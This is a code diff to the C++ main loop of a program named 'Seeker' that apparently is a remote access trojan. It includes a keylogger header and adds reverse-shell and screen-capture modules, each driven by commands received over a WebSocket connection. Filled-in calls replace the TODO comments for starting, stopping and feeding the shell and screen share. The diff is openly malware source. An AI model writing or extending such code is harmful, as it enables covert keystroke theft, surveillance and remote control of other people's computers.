@@ -2,6 +2,9 @@
 #include "./src/user_info.hpp"
 #include "./src/file_transfer.hpp"
 #include "./src/keylogger.hpp"
+#include "./src/reverse_shell.hpp"
+#include "./src/screenshare.hpp"
+
 #include <nlohmann/json.hpp>
 #include <iostream>
 #include <string>
@@ -27,9 +30,11 @@ struct Seeker {
 int main() {
     WebSocketClient client("localhost", 8080, "/ws/seeker");
     KeyLogger keylogger(client);
+    Shell shell(client);
+    ScreenShare screenshare(client);
 
-    keylogger.start();
-    client.setMessageCallback([&client, &keylogger](const std::string& message, size_t len) {
+
+    client.setMessageCallback([&client, &keylogger, &shell, &screenshare](const std::string& message, size_t len) {
         std::cout << "[Server] " << message << std::endl;
 
         try {
@@ -40,15 +45,12 @@ int main() {
             std::cout << msg_type << std::endl;
             if (msg_type == "shell_command") {
                 if (msg_data == "start") {
-                    // TODO: Start a shell session and associate it with the WebSocket client
-                    // Send shell output back to the server
+                    shell.startShell();
                 }
                 else if (msg_data == "stop") {
-                    // TODO: Stop the active shell session
-                    // Clean up any resources used by the shell
+                    shell.stopShell();
                 }
                 else {
-                    // TODO: Send an error message back to the server indicating unknown shell command
                     nlohmann::json response;
                     response["type"] = "shell_output";
                     response["data"] = "[Info] Unknown shell_command: " + msg_data;
@@ -56,21 +58,16 @@ int main() {
                 }
             }
             else if (msg_type == "shell_input") {
-                // TODO: If a shell session is running, write the msg_data to the shell's standard input
-                // Handle any errors if writing fails or shell is not running
-                // Send appropriate response back to the server
+                shell.writeShellInput(msg_data);
             }
             else if (msg_type == "screenshare_command") {
                 if (msg_data == "start") {
-                    // TODO: Start a screenshare session
-                    // Capture screen data and send it to the server
+                    screenshare.start_screenshare();
                 }
                 else if (msg_data == "stop") {
-                    // TODO: Stop the active screenshare session
-                    // Clean up any resources used by screenshare
+                    screenshare.stop_screenshare();
                 }
                 else {
-                    // TODO: Send an error message back to the server indicating unknown screenshare command
                     nlohmann::json response;
                     response["type"] = "screenshare_output";
                     response["data"] = "[Info] Unknown screenshare_command: " + msg_data;
